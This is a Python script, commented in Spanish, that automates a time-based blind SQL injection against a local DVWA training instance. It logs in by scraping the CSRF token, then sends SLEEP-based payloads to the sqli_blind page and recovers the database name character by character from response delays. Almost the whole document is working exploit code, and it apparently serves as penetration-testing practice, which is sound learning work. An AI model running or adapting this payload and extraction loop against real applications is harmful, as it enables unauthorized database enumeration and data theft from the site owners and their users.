# SQL Injection Blind Time-Based
# Tested en DVWA

# docker pull vulnerables/web-dvwa
# docker run --rm -p 8080:80 --name dvwa vulnerables/web-dvwa

# pip install requests beautifulsoup4 pwntools

import requests
from bs4 import BeautifulSoup
import signal, sys, time, string
from pwn import log 

# Configuración
LOGIN_URL = "http://localhost:8080/login.php"
TARGET_URL = "http://localhost:8080/vulnerabilities/sqli_blind/"
USERNAME = "admin"
PASSWORD = "password"

# Caracteres para fuerza bruta
CHARACTERS = string.ascii_letters + string.digits + "_-"

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(0)

def login():
    session = requests.session()

    # Obtener el token csrf de login
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, 'html.parser')
    token_input = soup.find("input", { "name": "user_token"})

    if not token_input:
        print("[-] No se encontró token CSRF")
        return None
    
    token = token_input.get("value")

    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }

    response = session.post(LOGIN_URL, data=data)

    if "Login failed" in response.text:
        print("[-] Falló el login.")
        return None
    
    print("[+] Sesión iniciada correctamente.")
    return session

def blind_sqli(session):
    database = ""
    char_bar = log.progress("Caracteres")
    restult_bar = log.progress("Base de datos")

    # Longitud de nombre de base de datos
    for pos in range(1, 20):
        found_char = False
        for char in CHARACTERS:
            payload = f"1' AND IF(SUBSTRING(DATABASE(),{pos},1)='{char}',SLEEP(0.5),0)-- -"

            try:
                params = {
                    "id": payload,
                    "Submit": "Submit"
                }

                char_bar.status(f"Probando posicion {pos} con '{char}'")
                start = time.time()
                resp = session.get(TARGET_URL, params=params)
                delay = time.time() - start

                if delay > 0.4:
                    database += char
                    restult_bar.status(database)
                    found_char = True
                    break
            except Exception as e:
                print(f"[-] Error en la petición: {str(e)}")
                continue

        if not found_char:
            if pos == 1:
                print("[-] No se encontró ningún carácter")
            break
    
    char_bar.success("Proceso completado")
    restult_bar.success(f"{database or 'No encontrado'}")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, def_handler)

    session = login()
    if session:
        blind_sqli(session)
